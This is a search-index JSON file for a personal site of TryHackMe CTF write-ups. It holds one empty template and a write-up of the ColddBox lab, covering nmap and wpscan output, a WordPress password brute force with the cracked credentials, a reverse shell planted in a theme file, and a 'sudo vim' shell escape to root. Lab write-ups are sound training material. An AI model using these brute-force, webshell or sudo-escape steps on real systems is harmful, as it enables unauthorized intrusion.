{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to my CTF Writeups","text":"<p>This page contains my writeups for various TryHackMe CTFs, organized by difficulty levels.  Click on the links below to navigate to each section:</p> <ul> <li>Easy CTFs</li> <li>Medium CTFs</li> <li>Hard CTFs</li> <li>Insane CTFs</li> </ul> <p>Note: certain sections are currently under development and may not yet be fully functional. It is normal to receive 404 errors as I work to update the site.</p> <p>"},{"location":"#find-me-here","title":"Find me here","text":""},{"location":"easy/ARcHanG3l/","title":"ARcHanG3l","text":"<p>Description</p> <p><p></p></p>"},{"location":"easy/ARcHanG3l/#scanning","title":"Scanning","text":"<ul> <li> <p>Assigned IP address: \u00a0 </p> </li> <li> <p>Open Ports: </p> </li> </ul> <p>PORT</p> <p>SERVICE</p> <p>DESCRIPTION <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <ul> <li>Nmap Report:   </li> </ul>"},{"location":"easy/ARcHanG3l/#enumeration","title":"Enumeration","text":""},{"location":"easy/ARcHanG3l/#initial-access","title":"Initial Access","text":""},{"location":"easy/ARcHanG3l/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"easy/ARcHanG3l/#gaining-user-access","title":"Gaining User access","text":""},{"location":"easy/ARcHanG3l/#gaining-root-access","title":"Gaining Root access","text":""},{"location":"easy/colddbox/","title":"ColddBox Easy","text":"<p>Description</p> <p><p></p></p> <p>In this CTF, I was able to successfully exploit a WordPress server using a combination of tools and techniques. In this blog post, I will share my experience and provide insights on how I was able to get the initial foothold, escalate my privileges, and finally became root.</p>"},{"location":"easy/colddbox/#scanning","title":"Scanning","text":"<ul> <li> <p>Assigned IP address: \u00a0 </p> </li> <li> <p>Open Ports: </p> </li> </ul> <p>PORT</p> <p>SERVICE</p> <p>DESCRIPTION <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <ul> <li>Nmap Report:   <pre><code># Nmap 7.93 scan initiated Mon Feb 20 13:34:05 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.237.179\nNmap scan report for 10.10.237.179\n  Host is up (0.15s latency).\n  Not shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-generator: WordPress 4.1.31\n  |_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: ColddBox | One more machine\n  4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: |   2048 4ebf98c09bc536808c96e8969565973b (RSA)\n|   256 8817f1a844f7f8062fd34f733298c7c5 (ECDSA)\n|_  256 f2fc6c750820b1b2512d94d694d7514f (ED25519)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n  TCP/IP fingerprint:\n  OS:SCAN(V=7.93%E=4%D=2/20%OT=80%CT=1%CU=42564%PV=Y%DS=5%DC=I%G=Y%TM=63F36FE\n  OS:8%P=aarch64-unknown-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS\n  OS:=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M\n  OS:505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68\nOS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q\n  OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A\n  OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y\n  OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T\n  OS:=40%CD=S)\n\nNetwork Distance: 5 hops\n\n  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n  # Nmap done at Mon Feb 20 08:04:40 2023 -- 1 IP address (1 host up) scanned in -19765.28 seconds\n</code></pre></li> </ul>"},{"location":"easy/colddbox/#enumeration","title":"Enumeration","text":"<p>The first step in this process was to enumerate the webserver (WordPress) with its vulnerable plugins, themes, and users using wpscan. </p> <p>User Enumeration</p> <p><p><code>wpscan --url http://$IP -e  u</code></p></p> <p>After running this command, it returned c0ldd, philip, and hugo as usernames.</p> <pre><code>[+] URL: http://10.10.237.179/ [10.10.237.179]\n[+] Started: Mon Feb 20 13:13:31 2023\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)\n| Found By: Headers (Passive Detection)\n| Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://10.10.237.179/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n| Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://10.10.237.179/readme.html\n | Found By: Direct Access (Aggressive Detection)\n| Confidence: 100%\n\n[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).\n | Found By: Rss Generator (Passive Detection)\n|  - http://10.10.237.179/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.1.31&lt;/generator&gt;\n |  - http://10.10.237.179/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.1.31&lt;/generator&gt;\n\n[+] WordPress theme in use: twentyfifteen\n | Location: http://10.10.237.179/wp-content/themes/twentyfifteen/\n | Last Updated: 2022-11-02T00:00:00.000Z\n | Readme: http://10.10.237.179/wp-content/themes/twentyfifteen/readme.txt\n | [!] The version is out of date, the latest version is 3.3\n | Style URL: http://10.10.237.179/wp-content/themes/twentyfifteen/style.css?ver=4.1.31\n | Style Name: Twenty Fifteen\n | Style URI: https://wordpress.org/themes/twentyfifteen\n | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen simple, st...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\nBrute Forcing Author IDs - Time: 00:00:01 &lt;========================================&gt; (10 / 10) 100.00% Time: 00:00:01\n\n[i] User(s) Identified:\n\n[+] the cold in person\n | Found By: Rss Generator (Passive Detection)\n\n[+] hugo\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n| Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] c0ldd\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n| Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] philip\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n| Confirmed By: Login Error Messages (Aggressive Detection)\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n</code></pre> <p>I decided to brute force the usernames and passwords using wpscan's built-in feature.</p> <p>Brute Force</p> <p><p><code>wpscan --url $IP -U 'c0ldd,hugo,philip' -P /usr/share/seclists/Passwords/probable-v2-top12000.txt</code></p></p> <pre><code>[+] Enumerating Config Backups (via Passive and Aggressive Methods)\nChecking Config Backups - Time: 00:00:04 &lt;=======================================&gt; (137 / 137) 100.00% Time: 00:00:04\n\n[i] No Config Backups Found.\n\n[+] Performing password attack on Wp Login against 3 user/s\n[SUCCESS] - c0ldd / 9876543210                                                                                        ^Cying philip / beanie Time: 00:09:52 &lt;========                                 &gt; (8839 / 40665) 21.73%  ETA: 00:35:35\n[!] Valid Combinations Found:\n | Username: c0ldd, Password: 9876543210\n[!] No WPScan API Token given, as a result vulnerability data has not been output.(8844 / 40665) 21.74%  ETA: 00:35:34\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Mon Feb 20 13:32:05 2023\n[+] Requests Done: 8984\n[+] Cached Requests: 38\n[+] Data Sent: 2.909 MB\n[+] Data Received: 32.484 MB\n[+] Memory used: 304.16 MB\n[+] Elapsed time: 00:09:59\n</code></pre>"},{"location":"easy/colddbox/#initial-access","title":"Initial Access","text":"<p>Quickly, I directed to <code>/wp-login.php</code> to verify login with the harvested credentials -- c0ld:9876543210</p> <p></p> <p>After successfully logging in using the credentials for <code>c0ldd</code>, I edited the 404.php file in the appearance tab of the themes section to add a reverse shell. This allowed me to get my initial foothold into the web server. </p> <p></p> <p>I opened a listener on another tab and then opened the 404.php file in my browser. As a result, I gained access to the server with the <code>www-data</code> privilege.</p> <p> </p>"},{"location":"easy/colddbox/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"easy/colddbox/#gaining-user-access","title":"Gaining User access","text":"<p>As www-data, I didn't initially have access to any juicy information. However, I was able to run linpeas.sh, which helped me to find some credentials that were left in the wp-config.php file. </p> <p></p> <p>I copied the username and password and attempted to access the <code>3306</code> port that was running on <code>127.0.0.1</code> but had no luck. Finally, I tried using the same credentials to log in to the <code>c0ldd</code> account. This was a success, and I was able to escalate my privilege from <code>www-data</code> to <code>c0ldd</code>.</p>"},{"location":"easy/colddbox/#gaining-root-access","title":"Gaining Root access","text":"<p>As <code>c0ldd</code>, I ran sudo -l as I already knew his password. The output showed that Vim could be run as sudo.</p> <p></p> <p>With this knowledge, I was able to execute the command </p> <p>Sudo Command</p> <p><p><code>sudo vim -c ':!/bin/sh'</code></p></p> <p>from GTFOBINS. This allowed me to edit a file that was owned by root, thereby giving me access to the root user. As a result, I was able to escalate my privilege once again and become root.</p>"}]}